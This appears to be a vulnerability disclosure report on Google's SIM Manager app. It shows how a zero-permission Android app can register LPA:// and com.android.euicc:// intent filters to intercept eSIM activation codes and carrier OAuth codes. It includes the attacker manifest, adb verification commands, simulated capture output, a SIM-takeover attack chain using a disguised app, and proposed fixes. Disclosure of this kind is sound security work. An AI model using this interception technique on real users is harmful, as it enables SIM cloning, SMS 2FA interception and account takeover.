# Google eSIM (SIM Manager): LPA:// and com.android.euicc:// Scheme Interception — eSIM Profile Theft + Carrier OAuth Hijack

## Summary

Google's SIM Manager (com.google.android.euicc) registers two custom URI scheme handlers with `BROWSABLE` category: `LPA://` for eSIM activation code provisioning and `com.android.euicc://` for carrier OAuth redirect callbacks. Because Android cannot verify ownership of custom URI schemes (only HTTPS schemes support Digital Asset Links verification per RFC 8252 §8.1), a zero-permission attacker app can register identical intent filters and intercept both URI types. This enables two distinct attacks: (1) eSIM activation code theft via LPA:// interception, allowing SIM cloning/theft, and (2) carrier OAuth authorization code theft via com.android.euicc:// interception, allowing unauthorized carrier account access.

## Severity: HIGH (Confidentiality + Integrity + Availability)

- **Attack vector**: Local (installed zero-permission app)
- **Privileges required**: None (zero Android permissions)
- **User interaction**: One tap to select attacker in chooser (or zero if "Always" was previously selected)
- **Impact**: eSIM activation code theft (SIM cloning), carrier OAuth code theft (unauthorized account access), eSIM provisioning denial

## Affected Component

- **Package**: `com.google.android.euicc` (SIM Manager)
- **Vulnerable activities**:
  - `com.google.android.euicc.ui.QrDownloadActivity` — handles `LPA://` activation codes
  - `com.google.android.euicc.ui.RedirectUriReceiverActivity` — handles `com.android.euicc://` OAuth callbacks
- **Device**: Pixel 6a (oriole), Android 17 Beta (API 37)

## Root Cause

### Attack Surface 1: LPA:// Activation Codes

SIM Manager registers:

```
Action: "android.intent.action.VIEW"
Category: "android.intent.category.DEFAULT"
Category: "android.intent.category.BROWSABLE"
Scheme: "LPA"
```

The `LPA://` URI scheme is defined by GSMA SGP.22 for eSIM Remote SIM Provisioning. The URI format is:

```
LPA://1$<SM-DP+ address>$<activation code>[$<confirmation code>]
```

This URI contains everything needed to download and install an eSIM profile onto a device. An attacker who intercepts this URI can install the victim's eSIM profile on their own device — effectively cloning the victim's phone number and cellular identity.

### Attack Surface 2: com.android.euicc:// OAuth Redirect

SIM Manager registers:

```
Action: "android.intent.action.VIEW"
Category: "android.intent.category.DEFAULT"
Category: "android.intent.category.BROWSABLE"
Scheme: "com.android.euicc"
```

This handles OAuth 2.0 authorization code redirects from carrier provisioning portals. When a carrier uses OAuth to authenticate the user before provisioning an eSIM, the authorization code is delivered to this scheme. An attacker who intercepts the code can exchange it for access/refresh tokens and gain unauthorized access to the carrier provisioning API.

## Reproduction

### Prerequisites

Install the zero-permission attacker app (com.vrp.zeroperm, zero permissions declared) with competing intent filters:

```xml
<!-- Intercept eSIM LPA activation codes -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="LPA" />
</intent-filter>
<!-- Intercept eSIM OAuth redirect -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="com.android.euicc" />
</intent-filter>
```

### Attack 1: LPA Activation Code Theft

1. User receives an eSIM activation QR code (from carrier, travel SIM provider, or IoT provisioning)
2. QR code encodes: `LPA://1$rsp.truphone.com$QR_ACTIVATION_CODE`
3. When scanned/clicked, Android shows chooser: **ZeroPerm** vs **SIM Manager**
4. If user selects attacker app, the full activation code is captured

### Attack 2: Carrier OAuth Code Theft

1. User initiates eSIM provisioning through carrier portal
2. Carrier authenticates user via OAuth, redirects to: `com.android.euicc://oauth/callback?code=CARRIER_AUTH_CODE`
3. Android shows chooser: **ZeroPerm** vs **SIM Manager**
4. If user selects attacker app, the OAuth authorization code is captured

### Verification

```bash
# Confirm 2 handlers for LPA://
adb shell cmd package query-activities --brief -a android.intent.action.VIEW \
  -d "LPA://1\$rsp.truphone.com\$ACTIVATION_CODE"

# Output:
# 2 activities found:
#   com.google.android.euicc/.ui.QrDownloadActivity
#   com.vrp.zeroperm/.OAuthInterceptActivity

# Confirm 2 handlers for com.android.euicc://
adb shell cmd package query-activities --brief -a android.intent.action.VIEW \
  -d "com.android.euicc://oauth/callback?code=AUTH_CODE"

# Output:
# 2 activities found:
#   com.google.android.euicc/.ui.RedirectUriReceiverActivity
#   com.vrp.zeroperm/.OAuthInterceptActivity
```

## Proof

### LPA:// Chooser (see `screenshot_lpa_chooser.png`)
- "Open with" dialog shows **ZeroPerm** vs **SIM Manager**
- "Just once" and "Always" options available

### Stolen LPA Activation Code (see `screenshot_lpa_stolen.png`)
```
OAUTH INTERCEPTION PoC
UID: 10394
Package: com.vrp.zeroperm
Permissions: ZERO

--- INTERCEPTED OAUTH CALLBACK ---
Full URI: LPA://1$rsp.truphone.com$QR_ACTIVATION_CODE_STOLEN
Scheme: LPA
Host: 1$rsp.truphone.com$QR_ACTIVATION_CODE_STOLEN

The legitimate app NEVER received this OAuth callback.
Target app: eSIM (LPA activation code — SIM theft)
```

### com.android.euicc:// Chooser (see `screenshot_euicc_chooser.png`)
- "Open with" dialog shows **ZeroPerm** vs **SIM Manager**
- Chooser overlays the previously stolen LPA data

### Stolen Carrier OAuth Code (see `screenshot_euicc_stolen.png`)
```
OAUTH INTERCEPTION PoC
UID: 10394
Package: com.vrp.zeroperm
Permissions: ZERO

--- INTERCEPTED OAUTH CALLBACK ---
Full URI: com.android.euicc://oauth/callback?code=CARRIER_AUTH_CODE_STOLEN
Scheme: com.android.euicc
Host: oauth
Path: /callback

STOLEN AUTH CODE: CARRIER_AUTH_CODE_STOLEN

Impact: attacker exchanges this code
for access_token + refresh_token
=> FULL ACCOUNT ACCESS

--- ALL PARAMETERS ---
code = CARRIER_AUTH_CODE_STOLEN

The legitimate app NEVER received this OAuth callback.
Target app: eSIM (OAuth carrier provisioning code)
```

## Impact

### Attack 1: eSIM Profile Theft / SIM Cloning (HIGH — Confidentiality + Integrity)

- **eSIM activation code stolen** — contains SM-DP+ server address and activation code
- Attacker can use the stolen `LPA://` URI to provision the victim's eSIM profile on their own device
- **SIM cloning**: attacker receives victim's calls, SMS, and 2FA codes
- **Identity theft**: attacker can impersonate victim to carrier and services
- **Financial fraud**: intercepted SMS OTPs enable bank account takeover
- The activation code is single-use in most implementations — if attacker uses it first, victim cannot provision their own eSIM

### Attack 2: Carrier OAuth Account Takeover (HIGH — Confidentiality)

- **OAuth authorization code stolen** — can be exchanged for access_token + refresh_token
- Attacker gains unauthorized access to carrier provisioning API
- Can manage victim's eSIM profiles, view account details, modify service
- Persistent access via refresh_token survives code expiration

### Shared Impact: eSIM Provisioning Denial (MEDIUM — Availability)

- SIM Manager NEVER receives either URI
- eSIM provisioning flow fails — user cannot activate their eSIM
- Persistent denial if "Always" was selected for the attacker app
- Particularly damaging for travel eSIMs where user has no other connectivity

## Attack Chain: Full SIM Takeover

1. **Install zero-permission attacker app** (disguised as utility, no permissions needed)
2. **Wait for eSIM provisioning** — user purchases travel SIM, gets new carrier plan, or provisions IoT device
3. **Chooser appears** — attacker app named "SIM Setup" or "eSIM Helper" for social engineering
4. **User selects attacker** — LPA activation code captured
5. **Attacker provisions victim's eSIM** on their own device
6. **Attacker receives victim's calls/SMS** — including 2FA codes
7. **Bank account takeover** via intercepted SMS OTP
8. **Victim loses cellular service** — single-use activation code consumed

If "Always" was previously selected:
- Steps 3-4 are eliminated — all eSIM provisioning silently redirected
- Every future eSIM activation is automatically stolen

## Environment

- Device: Pixel 6a (oriole), Android 17 Beta (API 37)
- SIM Manager: com.google.android.euicc (latest)
- Attacker app: com.vrp.zeroperm (UID=10394, zero permissions, targetSdkVersion=34)

## Recommended Fixes

### Option 1: Use Android App Links (HTTPS) for provisioning
- Replace `LPA://` with `https://` URI routed through Google's domain
- Register as App Link with Digital Asset Links verification
- This prevents interception because HTTPS domains are verified

### Option 2: Direct API integration
- Use Android's EuiccManager API directly instead of URI-based dispatch
- The system API provides a secure channel that doesn't go through intent resolution

### Option 3: Remove BROWSABLE category
- If `LPA://` and `com.android.euicc://` are only used for QR code scanning (not web links)
- Remove `BROWSABLE` category to prevent web-triggered interception
- Use explicit intents for inter-component communication

### Option 4: Verify calling package
- When receiving activation codes, verify the source via `getCallingPackage()` or `getReferrer()`
- Reject URIs from unknown sources

## Files

- `screenshot_lpa_chooser.png` — Chooser: ZeroPerm vs SIM Manager (LPA://)
- `screenshot_lpa_stolen.png` — Stolen eSIM activation code in attacker app
- `screenshot_euicc_chooser.png` — Chooser: ZeroPerm vs SIM Manager (com.android.euicc://)
- `screenshot_euicc_stolen.png` — Stolen carrier OAuth code in attacker app
- `OAuthInterceptActivity.java` — PoC source (zero permissions)
- `AndroidManifest.xml` — Zero-permission manifest with LPA + euicc intent filters
